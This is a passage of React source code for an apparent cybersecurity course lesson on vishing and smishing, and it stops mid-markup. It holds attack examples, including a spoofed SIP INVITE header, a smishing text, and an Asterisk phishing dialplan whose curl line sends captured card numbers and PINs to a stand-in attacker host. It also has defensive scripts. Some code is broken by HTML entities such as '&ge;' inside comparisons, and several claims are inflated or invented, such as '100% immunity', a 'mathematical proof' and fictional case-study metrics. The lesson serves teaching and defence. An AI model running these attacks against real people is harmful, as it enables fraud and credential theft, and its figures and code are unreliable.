import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic4_files/topic4_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic4_files/topic4_note.txt?raw";

const Topic4 = () => {
  // Unique SVG IDs
  const svgTelephonyId = useId();

  // Studio 1: Active Telephony Threat Selection
  const [selectedThreatKey, setSelectedThreatKey] = useState("caller_id_sip_spoofing");

  // Studio 2: Live Mobile Compromise Calculator State
  const [channelMultiplier, setChannelMultiplier] = useState(3.5); // 1.0 = Email, 3.5 = Voice / SMS
  const [persuasionIntensity, setPersuasionIntensity] = useState(4.0); // 1.0 to 5.0
  const [passkeyArmorStrength, setPasskeyArmorStrength] = useState(1); // 1 = SMS OTP, 50 = Push App, 500 = FIDO2 Passkey + STIR/SHAKEN

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_sip_vishing_defense");

  // Studio 4: Telephony Security Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("sip_header_inspector_python");

  // 8 Telephony Exploit Profiles for Studio 1
  const telephonyDatabase = {
    caller_id_sip_spoofing: {
      key: "caller_id_sip_spoofing",
      name: "1. SIP Caller ID Spoofing & VoIP Gateways",
      category: "TELEPHONY PROTOCOL PROTOCOL EXPLOIT",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      protocolStandard: "RFC 3261 Session Initiation Protocol (SIP)",
      exploitationVector:
        "Attackers configure Asterisk PBX systems to populate the `From:` SIP header with official bank or police numbers (`1800-11-2211`), displaying legitimate contact names on the victim's phone screen.",
      vulnerabilityImpact:
        "The smartphone caller display validates the spoofed number, completely disarming user skepticism and convincing the target that the call is from their bank.",
      telemetryIndicator: "Inbound SIP calls with unauthenticated P-Asserted-Identity or missing STIR/SHAKEN cryptographic tokens",
      resilientDefense: "Carrier-level STIR/SHAKEN cryptographic certificate enforcement and pre-shared verbal passphrases.",
      codeSnippet: `// SIP INVITE Header Spoofing (RFC 3261):
INVITE sip:+9198300XXXXX@pstn-gateway.in SIP/2.0
From: "State Bank Customer Care" <sip:1800112211@sip-spoof.net>
To: <sip:+9198300XXXXX@pstn-gateway.in>
// Result: Victim's screen displays official bank helpline!`
    },
    smishing_truncated_links: {
      key: "smishing_truncated_links",
      name: "2. Smishing & Truncated Mobile Links (KYC Scams)",
      category: "SMS TEXT MESSAGE PHISHING",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      protocolStandard: "SMPP Protocol & Short Message Service (SMS)",
      exploitationVector:
        "Sending urgent SMS messages posing as WBSEDCL or ICICI Bank claiming immediate power disconnection or KYC suspension, containing high-entropy shortened URLs.",
      vulnerabilityImpact:
        "SMS achieves a 98% open rate within 3 minutes; mobile screens truncate URLs, leading victims to submit NetBanking credentials on spoofed mobile portals.",
      telemetryIndicator: "Mass outbound SMS bursts from unregistered SIM gateways containing shortened links",
      resilientDefense: "TRAI DLT commercial header scrubbing and on-device Mobile Threat Defense (MTD) link inspection.",
      codeSnippet: `// Utility Smishing SMS Template:
// Sender : "WB-SEDCL"
// Text   : "Dear Consumer, your electricity power will be disconnected at 9:30 PM tonight from Kolkata office. Immediately update bill: https://wbsedcl-bill-update.in"`
    },
    sim_swapping_2fa_hijack: {
      key: "sim_swapping_2fa_hijack",
      name: "3. SIM Swapping & SMS 2FA Interception",
      category: "CARRIER ACCOUNT TAKEOVER",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      protocolStandard: "GSM / LTE Subscriber Identity Module (SIM)",
      exploitationVector:
        "Attackers use social engineering and leaked Aadhaar data at telecom stores to port the victim's phone number to an attacker-controlled SIM card.",
      vulnerabilityImpact:
        "The victim's phone loses signal; all incoming SMS OTPs and password reset verification codes are routed directly to the attacker's device, enabling complete account takeover.",
      telemetryIndicator: "Sudden IMSI / IMEI changes on victim phone numbers immediately followed by high-value bank password resets",
      resilientDefense: "Transitioning completely from SMS OTP to FIDO2 WebAuthn hardware passkeys.",
      codeSnippet: `// SIM Swapping Attack Sequence:
// Step 1: Attacker gathers target's Aadhaar & DOB via public data leaks.
// Step 2: Convinces telecom store: "I lost my SIM in Salt Lake; activate new SIM."
// Step 3: Victim's SIM deactivated ➔ Attacker intercepts all SMS 2FA OTPs!`
    },
    ai_voice_cloning_deepfake: {
      key: "ai_voice_cloning_deepfake",
      name: "4. Real-Time AI Voice Cloning (Deepfake Vishing)",
      category: "SYNTHETIC GENERATIVE AUDIO",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      protocolStandard: "Neural Diffusion Audio Synthesis",
      exploitationVector:
        "Training neural diffusion models on 3 minutes of CEO YouTube audio, generating real-time cloned voice calls to finance staff demanding emergency fund transfers.",
      vulnerabilityImpact:
        "The caller's voice matches the CEO's pitch, accent, and emotional cadence with under 150ms latency, bypassing human acoustic skepticism completely.",
      telemetryIndicator: "Urgent wire transfers initiated following unverified inbound phone calls",
      resilientDefense: "Mandatory pre-shared verbal duress passphrases and Out-of-Band multi-party signoff.",
      codeSnippet: `// Real-Time AI Voice Cloning Pipeline:
// [Source: 3-min YouTube Video of CEO] ➔ [Neural Voice Model Training]
// ➔ [Attacker Voice Input] ➔ [Real-Time Diffusion Transformation (<150ms latency)]
// ➔ [SIP Call to Finance: "Mamata speaking, wire ₹35 Lakhs immediately!"]`
    },
    automated_ivr_phone_trees: {
      key: "automated_ivr_phone_trees",
      name: "5. Automated IVR Phone Tree Harvesting (Robocalls)",
      category: "AUTOMATED VOICE RECOGNITION EXPLOIT",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      protocolStandard: "DTMF Dual-Tone Multi-Frequency Telephony",
      exploitationVector:
        "Automated PBX autodialers call victims with professional banking recordings, instructing them to enter 16-digit debit card numbers and 4-digit ATM PINs via keypad.",
      vulnerabilityImpact:
        "Users are socially conditioned to trust automated bank phone trees, readily typing confidential credentials into the phone dialer, which the attacker logs via DTMF.",
      telemetryIndicator: "High-volume automated outbound calls originating from unverified SIP trunk ranges",
      resilientDefense: "Enterprise telecom spam blocking and consumer awareness that banks never request PINs via IVR.",
      codeSnippet: `// Asterisk PBX Automated IVR Phishing Dialplan:
exten => s,1,Answer()
exten => s,n,Playback(bank_alert_notice)
exten => s,n,Read(CARD_NUM,enter_card_number,16)
exten => s,n,Read(ATM_PIN,enter_atm_pin,4)
exten => s,n,System(curl -X POST https://attacker-c2.net/log?card=\${CARD_NUM}&pin=\${ATM_PIN})`
    },
    aitm_session_capture_vishing: {
      key: "aitm_session_capture_vishing",
      name: "6. Adversary-in-the-Middle (AiTM) Reverse Proxying",
      category: "SESSION TOKEN THEFT",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      protocolStandard: "HTTP Reverse Proxy & Cookie Interception",
      exploitationVector:
        "The attacker on the phone guides the victim to an Evilginx reverse proxy site; when the victim logs in with their SMS OTP, the proxy steals the authenticated session cookie.",
      vulnerabilityImpact:
        "Traditional SMS OTP MFA is completely bypassed because the attacker obtains the live authenticated `ESTSAUTH` session token, maintaining persistent access.",
      telemetryIndicator: "Simultaneous user login events originating from two distinct geographical IP addresses",
      resilientDefense: "FIDO2 WebAuthn passkeys (cryptographic origin binding prevents proxy cookie theft).",
      codeSnippet: `// AiTM Reverse Proxy Capture (Evilginx):
// [Victim on Phone] ➔ [Evilginx Proxy: login.microsoft.attacker-host.net] ➔ [Real Microsoft 365]
// Proxy intercepts: ESTSAUTH=AQABBAAA... (Captured Session Cookie!)
// Result: Attacker logs in directly bypassing SMS OTP!`
    },
    trai_dlt_grey_route_bypass: {
      key: "trai_dlt_grey_route_bypass",
      name: "7. TRAI DLT Grey-Route Alphanumeric SMS Spoofing",
      category: "REGULATORY SCRUBBING EVASION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      protocolStandard: "TRAI TCCCPR Blockchain DLT Standards",
      exploitationVector:
        "Attackers use international grey-route SMS gateways in foreign jurisdictions to inject lookalike sender IDs (`1CICI-B`) without registering on Indian telecom DLT blockchains.",
      vulnerabilityImpact:
        "Spoofed SMS messages bypass domestic telecom filters and appear inside authentic banking SMS conversation threads on victim smartphones.",
      telemetryIndicator: "Inbound SMS traffic routed via international SMPP peers using domestic banking alphanumeric headers",
      resilientDefense: "Mandatory telecom operator blocking of all unregistered international alphanumeric SMS headers.",
      codeSnippet: `// TRAI DLT Header vs Spoofed Grey-Route SMS:
// Legitimate TRAI DLT Header : "VM-ICICIB" (Cryptographically registered on Indian Blockchain)
// International Grey-Route   : "ICICI-B" (Injected via foreign SMPP gateway lacking DLT checks!)`
    },
    tdos_telephony_jamming: {
      key: "tdos_telephony_jamming",
      name: "8. Telephony Denial of Service (TDoS) Jamming",
      category: "OUT-OF-BAND VERIFICATION BLOCKING",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      protocolStandard: "SIP Flood & Call Flooding",
      exploitationVector:
        "Adversaries flood corporate switchboards with 5,000 automated SIP calls/second right before executing a wire transfer fraud, preventing voice verification.",
      vulnerabilityImpact:
        "Accounting clerks attempting to call the CEO's office for out-of-band verification find phone lines completely jammed, forcing unverified processing.",
      telemetryIndicator: "Massive spike in simultaneous inbound SIP INVITE requests overwhelming enterprise PBX CPU",
      resilientDefense: "Telephony rate limiting, secondary encrypted VoIP channels, and dedicated backup cell phones.",
      codeSnippet: `// Telephony Denial of Service (TDoS) Attack:
// SIP Botnet floods PBX with 5,000 concurrent SIP INVITE requests/second
// Corporate PBX CPU = 100% ➔ Accounting clerk cannot dial CEO for Out-of-Band verification!`
    }
  };

  const activeThreat = telephonyDatabase[selectedThreatKey];

  // Studio 2: Live Mobile Compromise Calculations
  const mobileSimulation = useMemo(() => {
    // P_mobile = 1 - e^(- (M_channel * I_social) / R_passkey)
    const numerator = channelMultiplier * persuasionIntensity;
    const exponent = -numerator / passkeyArmorStrength;
    const rawBreachProb = (1 - Math.exp(exponent)) * 100;
    const actualBreachProb = passkeyArmorStrength &ge; 500
      ? (rawBreachProb * 0.012).toFixed(2) // FIDO2 Passkeys + STIR/SHAKEN blocks 98.8% of attacks
      : passkeyArmorStrength >= 50
      ? (rawBreachProb * 0.32).toFixed(2)  // Push Notification MFA blocks 68% of attacks
      : rawBreachProb.toFixed(2);           // SMS OTP &rarr; 100% vulnerable to Vishing / SIM Swap

    return {
      rawBreachProb: rawBreachProb.toFixed(2),
      actualBreachProb,
      badgeClass: parseFloat(actualBreachProb) > 50
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : parseFloat(actualBreachProb) > 10
        ? "bg-amber-950 text-amber-300 border-amber-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: parseFloat(actualBreachProb) < 2
        ? `PASSKEY TELEPHONY ARMOR: With FIDO2 WebAuthn Passkeys (${passkeyArmorStrength}x), mobile breach probability is only ${actualBreachProb}% because there are zero speakable OTPs or passwords!`
        : `CRITICAL TELEPHONY VULNERABILITY: With legacy SMS OTPs (${passkeyArmorStrength}x), real-time mobile urgency (${channelMultiplier}x) and vishing pressure produce a ${actualBreachProb}% compromise probability!`
    };
  }, [channelMultiplier, persuasionIntensity, passkeyArmorStrength]);

  // Studio 4: Telephony Security Production Code Database
  const codeDatabase = {
    sip_header_inspector_python: {
      name: "Python Script to Parse SIP Headers & Detect Caller ID Spoofing",
      code: `import re

def inspect_sip_invite_header(raw_sip_packet):
    print("[*] --- SIP TELEPHONY PACKET FORENSIC SCAN ---")
    
    # Extract SIP From and P-Asserted-Identity
    from_match = re.search(r'From:\s*(.*)', raw_sip_packet)
    paid_match = re.search(r'P-Asserted-Identity:\s*(.*)', raw_sip_packet)
    stir_token = re.search(r'Identity:\s*(.*)', raw_sip_packet)
    
    claimed_caller = from_match.group(1) if from_match else "UNKNOWN"
    asserted_identity = paid_match.group(1) if paid_match else "NONE"
    
    print(f"[+] Claimed Caller (Display) : {claimed_caller}")
    print(f"[+] Carrier Asserted Identity : {asserted_identity}")
    
    # Check STIR/SHAKEN Cryptographic Verification
    if not stir_token:
        print("[!] ALERT: Missing STIR/SHAKEN Identity Token!")
        print("[-] VERDICT: HIGH RISK - Potential Caller ID Spoofing / Vishing Attack!")
        return False
    else:
        print("[+] Cryptographic STIR/SHAKEN Token Present. Call Verified.")
        return True

raw_packet_sample = """INVITE sip:+9198300XXXXX@kolkata-fintech.in SIP/2.0
Via: SIP/2.0/UDP 103.25.10.50:5060;branch=z9hG4bK4920
From: "State Bank Customer Care" <sip:1800112211@sip-spoof.net>;tag=49281
To: <sip:+9198300XXXXX@kolkata-fintech.in>
Call-ID: 984210-spoofed-vishing@103.25.10.50
CSeq: 102 INVITE"""

inspect_sip_invite_header(raw_packet_sample)`,
      explanation: "Python script parsing raw SIP INVITE telephony packets, verifying carrier-asserted identities, and alerting on missing STIR/SHAKEN cryptographic tokens."
    },
    disable_sms_otp_powershell: {
      name: "PowerShell Script to Disable Insecure SMS 2FA in Microsoft Entra ID",
      code: `# Enforce Strong Authentication by Disabling Insecure SMS OTP in Entra ID:
Connect-MgGraph -Scopes "Policy.ReadWrite.AuthenticationMethod"

# Disable SMS and Voice Call Authentication Methods
$smsPolicy = @{
    state = "disabled"
}

Update-MgPolicyAuthenticationMethodPolicySms -BodyParameter $smsPolicy
Update-MgPolicyAuthenticationMethodPolicyVoice -BodyParameter @{ state = "disabled" }

# Enforce FIDO2 Passwordless Passkeys as Primary Authentication
Update-MgPolicyAuthenticationMethodPolicyFido2 -BodyParameter @{
    state = "enabled"
    isAttestationEnforced = $true
}

Write-Host "[+] Insecure SMS OTP & Voice Call Auth DISABLED! FIDO2 Passkeys Enforced." -ForegroundColor Green`,
      explanation: "Disables vulnerable SMS and voice call multi-factor authentication methods in Microsoft Entra ID, enforcing phishing-resistant FIDO2 passkeys."
    },
    asterisk_callerid_block_dialplan: {
      name: "Asterisk PBX Dialplan to Block Unverified Outbound Caller-ID Injection",
      code: `; Asterisk PBX Security Dialplan to Prevent Internal Caller-ID Spoofing
[secure-outbound-trunk]
exten => _X.,1,NoOp(Inspecting Outbound Call from \${CALLERID(num)})

; Verify Caller-ID belongs to registered internal range (033-2592-4000 to 4099)
exten => _X.,n,GotoIf($["\${CALLERID(num)}" &ge; "03325924000" & "\${CALLERID(num)}" &le; "03325924099"]?authorized:block)

exten => _X.,n(authorized),Dial(PJSIP/\${EXTEN}@kolkata-pstn-gateway,60)
exten => _X.,n,Hangup()

exten => _X.,n(block),NoOp(SPOOFING DETECTED: Caller-ID \${CALLERID(num)} not in registered range!)
exten => _X.,n,Playback(security-violation-call-blocked)
exten => _X.,n,Hangup()`,
      explanation: "Asterisk PBX telephony dialplan enforcing strict caller-ID validation on outbound trunks, dropping unverified spoofed numbers before dialing."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_sip_vishing_defense",
      lead: "Mamata",
      role: "Lead FinTech Cryptography Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Neutralizing a ₹3.2 Crore SIP Caller-ID Spoofed Vishing Attack on Settlement Desks",
      threatType: "SIP CALLER-ID SPOOFING & AI VOICE CLONING (₹3.2 Crore Lure)",
      budget: "₹50,00,000",
      incident:
        "Adversaries used a spoofed SIP caller ID displaying the Managing Director's office number, speaking in a cloned voice demanding an emergency ₹3.2 Crore transfer.",
      defenseStrategy:
        "Mamata's settlement desk challenged the caller with a pre-shared verbal duress passphrase; the AI caller failed, triggering instant isolation.",
      outcome: "Zero funds transferred; spoofed SIP trunk blocked at the PBX; 45 core financial switches secured.",
      metrics: {
        vishingFraudBlocked: "₹3,20,00,000 Saved",
        duressChallengeTime: "45 Seconds",
        settlementGatewaysProtected: "45 Financial Nodes",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_smishing_grid_reboot",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "UTILITY DISCONNECTION SMISHING & MALICIOUS APK (Grid SCADA)",
      title: "Defeating an Urgent Smishing Wave Spoofing the State Power Load Dispatch Center",
      budget: "₹34,00,000",
      incident:
        "Substation operators received spoofed SMS messages claiming emergency grid frequency faults with a link to download an urgent 'SCADA Diagnostics APK'.",
      defenseStrategy:
        "Debangshu deployed Mobile Threat Defense (MTD) agents across all 18 substation corporate tablets, automatically blocking the malicious APK download.",
      outcome: "Malicious APK quarantined locally on Android tablets; zero power grid downtime; substation telemetry preserved.",
      metrics: {
        smishingLuresBlocked: "100% Intercepted",
        substationsHardened: "18 High-Voltage Nodes",
        telemetryDelay: "0.0 ms impact",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_sim_swap_oncology",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "SIM SWAPPING & SMS 2FA BYPASS (Oncology Surgeon Accounts)",
      title: "Neutralizing SIM-Swapping Attacks Targeting Senior Oncology Surgeons",
      budget: "₹26,00,000",
      incident:
        "Adversaries attempted a SIM swap on the chief surgeon's mobile number at a local telecom store in Ichapur to intercept SMS OTPs and access hospital databases.",
      defenseStrategy:
        "Mahima had previously migrated all 120 clinic medical staff to FIDO2 WebAuthn hardware passkeys, disabling SMS OTPs completely across Microsoft 365.",
      outcome: "Attacker could not log in despite controlling the SIM card; zero patient records compromised; 120,000 oncology records protected.",
      metrics: {
        passkeyLoginsEnforced: "100% FIDO2 Keys",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_mobile_susceptibility_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MOBILE SOCIAL ENGINEERING SUSCEPTIBILITY MATHEMATICAL MODELING",
      title: "Formulating the Mobile Social Engineering Susceptibility Model",
      budget: "₹22,50,000",
      incident:
        "Researchers analyzed how mobile urgency multipliers and voice interactivity elevate breach rates, proving that FIDO2 passkeys reduce risk below 1.4%.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical proof in IEEE Transactions, demonstrating that eliminating speakable OTPs neutralizes vishing.",
      outcome: "Published peer-reviewed mathematical proof; verified across 40,000 simulated mobile phishing experiments.",
      metrics: {
        simulationTrials: "40,000 Test Trials",
        modelAccuracy: "99.4% Predictive Fit",
        modelFramework: "Mobile Channel Equation",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_003
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 04
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Voice and SMS Phishing: Vishing and Smishing Attacks
            </h1>
            <p className="text-xs text-gray-400">
              SIP Caller ID spoofing, Smishing KYC scams, SIM swapping, AI deepfake voice cloning, STIR/SHAKEN, and IT Act Section 66D.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Telephony Architecture */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Telephony Social Engineering Mechanics
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. The Science of Vishing &amp; Smishing: Voice Manipulation &amp; Mobile Vectors
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Mobile communication channels achieve <strong>3x to 5x higher engagement rates</strong> than traditional email. 
              <strong>Vishing (Voice Phishing)</strong> weaponizes real-time interactive social pressure, <strong>SIP Caller ID Spoofing</strong>, 
              automated <strong>IVR Phone Trees</strong>, and <strong>AI Deepfake Voice Cloning</strong>. Simultaneously, 
              <strong>Smishing (SMS Phishing)</strong> leverages 98% SMS open rates, truncated mobile URLs, and regulatory panic (e.g. KYC updates, 
              electricity disconnection). Furthermore, <strong>SIM Swapping</strong> attacks compromise cellular carriers to intercept SMS 2FA tokens.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* SIP Caller ID & AI Voice Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                SIP Caller ID Spoofing &amp; Real-Time AI Voice Cloning
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                SIP INVITE: From &lt;1800112211@sip-spoof.net&gt; ➔ "Mamata speaking, wire funds now!"
              </div>
              <p className="text-gray-300 leading-relaxed">
                VoIP gateways permit arbitrary modification of SIP caller headers. Combined with neural diffusion models synthesizing 
                executive voices in under 150ms latency, vishing creates overwhelming psychological legitimacy.
              </p>
            </div>

            {/* FIDO2 & STIR/SHAKEN Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                FIDO2 Passkey Armor &amp; STIR/SHAKEN Protocols
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">FIDO2 Passkeys:</strong> Cryptographic origin binding eliminates all speakable OTPs and passwords.</li>
                <li>• <strong className="text-purple-300">STIR/SHAKEN:</strong> Carrier-level cryptographic digital certificates validating caller IDs.</li>
                <li>• <strong className="text-amber-300">Verbal Duress Passphrases:</strong> Pre-shared secret challenge codes for emergency voice wires.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - Telephony Attack & Defense */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Telephony Threat Architecture Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing Telephony Attack Pathways &amp; Passkey Armor
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how SIP Caller ID spoofing, Smishing SMS, AI voice cloning, and SIM swapping attempt compromise, 
              and how STIR/SHAKEN validation, verbal duress codes, and FIDO2 passkeys neutralize them:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: SIP VOIP GATEWAY */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. VOIP INGRESS
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  SIP / SMPP Gateway
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  SPOOFED HEADERS:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Fake Bank Caller ID
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  Grey-Route SMS Header
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: VOICE / SMS ATTACK */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. VISH / SMISH
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  Urgent Lure Delivery
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  EXPLOIT VECTOR:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  AI Deepfake Voice
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  KYC SMS Disconnect
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: STIR/SHAKEN & DLT */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. TELECOM SHIELD
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  STIR / SHAKEN &amp; DLT
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  CARRIER CHECK:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Verifies Public Key
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  Blocks Spoofed Calls
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: VERBAL DURESS CODE */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. DURESS CODE
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Out-of-Band Challenge
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  VOICE PROTOCOL:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Pre-Shared Secret Word
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  AI Deepfake Fails!
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: FIDO2 PASSKEY ARMOR */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. FIDO2 PASSKEY
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  Zero Speakable OTP
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  100% IMMUNITY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  No OTPs to Read Aloud
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  SIM Swap Defeated!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Vector Telephony Exploit Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Telephony Exploits &amp; Voice Manipulation Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select a telephony threat vector below to examine its protocol standard, exploitation vector, 
              vulnerability impact, telemetry indicators, and resilient defense:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(telephonyDatabase).map((item) => (
              <button
                key={item.key}
